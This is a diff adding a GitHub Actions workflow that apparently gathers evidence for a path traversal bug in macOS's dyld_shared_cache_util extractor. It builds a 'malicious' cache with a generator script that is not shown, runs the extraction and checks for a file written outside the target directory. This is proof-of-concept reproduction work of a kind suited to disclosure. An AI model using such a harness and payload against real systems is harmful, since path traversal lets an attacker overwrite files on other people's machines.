@@ -1,0 +1,56 @@
+name: DSC-EXTRACTOR-TRAVERSAL-1 Gate Evidence
+
+on:
+  workflow_dispatch:
+
+jobs:
+  dsc_traversal_poc:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Gate A — Hardware / OS identity
+        run: |
+          sw_vers
+          uname -m
+          system_profiler SPHardwareDataType | grep -E "Model|Processor|Chip"
+
+      - name: Build malicious dyld shared cache
+        run: |
+          python3 gen_malicious_dsc.py malicious_ci.cache
+          shasum -a 256 malicious_ci.cache
+
+      - name: Gate A — Run PoC (dyld_shared_cache_util -extract)
+        run: |
+          OUTDIR="$(mktemp -d /tmp/dsc_poc_out_XXXXXX)"
+          echo "Extraction directory: $OUTDIR"
+          /usr/bin/dyld_shared_cache_util -extract malicious_ci.cache "$OUTDIR" 2>&1 || true
+
+          echo ""
+          echo "=== Checking traversal target ==="
+          TRAVERSAL_TARGET="/tmp/poc_dsc_traversal_proof"
+          if [ -e "$TRAVERSAL_TARGET" ]; then
+            echo "TRAVERSAL CONFIRMED: file exists outside extraction directory"
+            ls -la "$TRAVERSAL_TARGET"
+            file "$TRAVERSAL_TARGET"
+            xxd "$TRAVERSAL_TARGET" | head -16
+            echo "--- Extraction dir (should NOT contain the file) ---"
+            ls -la "$OUTDIR" || true
+          else
+            echo "NOT TRIGGERED — extraction dir contents:"
+            find "$OUTDIR" -ls 2>/dev/null || true
+          fi
+
+      - name: Gate D — SHA-256 of PoC artifacts
+        run: |
+          shasum -a 256 gen_malicious_dsc.py malicious_ci.cache malicious.cache
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: dsc-traversal-evidence
+          path: |
+            malicious_ci.cache
+            gen_malicious_dsc.py
+          retention-days: 30
